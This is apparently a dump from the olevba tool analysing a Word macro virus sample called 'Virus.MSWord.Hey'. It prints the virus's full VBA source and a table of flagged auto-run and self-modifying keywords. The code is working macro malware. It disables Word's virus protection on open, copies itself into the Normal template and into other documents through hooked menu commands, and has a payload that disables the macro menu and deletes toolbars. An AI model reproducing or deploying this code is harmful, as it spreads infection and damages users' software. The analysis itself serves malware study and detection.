olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Hey
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Hey - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen(): Options.VirusProtection = 0:
ÁáÉ¦£×
End Sub
Sub ÁáÉ¦£×(): Set é = NormalTemplate.VBProject.VBComponents(1).CodeModule: Set á = ActiveDocument.VBProject.VBComponents(1).CodeModule: Set í = ThisDocument.VBProject.VBComponents(1).CodeModule
If é.CountOfLines = 0 Then é.InsertLines 1, í.Lines(1, 26)
If á.CountOfLines = 0 Then á.InsertLines 1, í.Lines(1, 26)
End Sub
Sub AutoNew(): ÁáÉ¦£×: MsgBox "Yeah": End Sub
Sub DateiNeu(): Dialogs(wdDialogFileNew).Show: ÁáÉ¦£×: End Sub
Sub BearbeitenEinfügen(): ÁáÉ¦£×: End Sub
Sub BearbeitenKopieren(): ÁáÉ¦£×: End Sub
Sub BearbeitenAusschneiden(): ÁáÉ¦£×: End Sub
Sub FormatZeichen(): ÁáÉ¦£×: End Sub
Sub ExtrasOptionen(): ÁáÉ¦£×: End Sub
Sub DateiÖffnen(): Dialogs(wdDialogFileOpen).Show: ÁáÉ¦£×: End Sub
Sub DocumentOpen(): Dialogs(wdDialogFileOpen).Show: ÁáÉ¦£×: End Sub
Sub DateiSchließen(): MsgBox "Yeah": End Sub
Sub DateiBeenden(): ÁáÉ¦£×: End Sub
'Hey this is the wild virus
Sub pay():
CommandBars("Tools").Controls("Makro").Enabled = False
If Day(15) And Month(Now) Then CommandBars("Info").Delete
If Day(30) And Month(Now) Then CommandBars("Table").Delete
If Day(1) And Month(Now) Then CommandBars("Insert").Delete
If Day(10) And Month(6) Then CommandBars("View").Delete
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |DocumentOpen        |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

